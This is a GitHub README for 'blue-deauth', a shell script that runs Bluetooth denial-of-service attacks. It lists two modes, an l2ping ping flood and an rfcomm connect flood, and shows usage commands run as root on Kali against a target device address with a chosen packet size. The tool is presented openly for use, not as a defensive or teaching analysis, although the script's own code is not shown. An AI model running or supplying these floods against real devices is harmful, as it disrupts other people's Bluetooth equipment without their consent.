
# Bluetooth deauthenticator - blue-deauth v0.1.2-alpha
A simple script that makes possible BLE deauthentication!

![Visitors](https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fits0x08%2Fblue-deauth%2F&countColor=%232ccce4&style=flat-square)
[![Semgrep](https://github.com/its0x08/blue-deauth/actions/workflows/semgrep.yml/badge.svg)](https://github.com/its0x08/blue-deauth/actions/workflows/semgrep.yml)
[![Codacy Security Scan](https://github.com/its0x08/blue-deauth/actions/workflows/codacy.yml/badge.svg?branch=master)](https://github.com/its0x08/blue-deauth/actions/workflows/codacy.yml)

### Simple usage
```bash
Bluetooth deauthenticator v0.1.2-beta
Attack types:
        1.) l2ping - Ping flood
        2.) rfcomm - Connect flood

 [i] Usage: blue_dos.sh <target_addr> <packet_size> <attack_type>
root@kali:/scripts/blue-deauth# bash blue_dos.sh FC:58:FA:XX:XX:XX 600 1
root@kali:/scripts/blue-deauth# bash blue_dos.sh FC:58:FA:XX:XX:XX 600 2
```

### Requirements:
```
l2ping (comes with bluez)
rfcomm (comes with bluez)
```

### Tested only in Kali but any Linux OS that uses bluez should work.
---
## Pull requests and issues are welcome!
